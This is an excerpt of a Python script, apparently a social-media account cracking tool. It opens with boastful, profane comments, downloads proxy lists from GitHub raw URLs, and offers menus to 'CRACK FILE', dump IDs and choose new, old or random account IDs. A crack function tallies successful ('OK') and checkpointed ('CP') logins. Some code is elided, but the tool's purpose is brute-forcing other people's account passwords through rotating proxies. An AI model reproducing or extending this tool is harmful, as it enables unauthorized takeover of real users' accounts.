#dzhayatem bkay awha masert abet 😂👌🏿
#awanay goran hamwyan doran
#Don't removie my name
#if you want chalenge me sleep and you can in your dreams 😂
#official fathers of telegram
#mother fucker come back
#fucked-by-X TIGER X
#fucked by @i4m_tiger
...
try:
	prox= requests.get('https://raw.githubusercontent.com/Bamoy/Buuhhh/main/porx1.txt').text
...
try:
	prox= requests.get('https://raw.githubusercontent.com/tiger-krd/xwla/main/.prox.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()
...
def menu():
	...
	banner()
	print('')
	print(' \033[1;94m[ 1 ] CRACK FILE [ ON ] ')
	print('')
	print(' \033[1;95m[ 2 ] CRAETE FILE [ ON ] ')
	print('')
	SALE = input(' \033[1;90m└──HALBZHERA = ')
	if SALE in ['1','01']:
		FILE()
	if SALE in ['2','02']:
		DUMP()
...
def setting():
	os.system('clear')
	banner()
	print(' \033[1;92mID NEW [ 1 ] = ')
	print('')
	print(' \033[1;92mID OLD [ 2 ] = ')
	print('')
	print(' \033[1;92mID RANDOM [ 3 ] [BEST] = ')
	print('')
	hu = input(' \033[1;90m└──HALBZHERA = ')
	print('')
	if hu in ['1','01']:
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write(f"\r \x1b[1;96m[  \x1b[1;96mxwla  \x1b[1;96m{loop}\x1b[1;90m＋\x1b[1;96m{len(id)}  \x1b[1;96mOK:{ok}  \x1b[1;96mCP:{cp}  ]"),
	sys.stdout.flush()
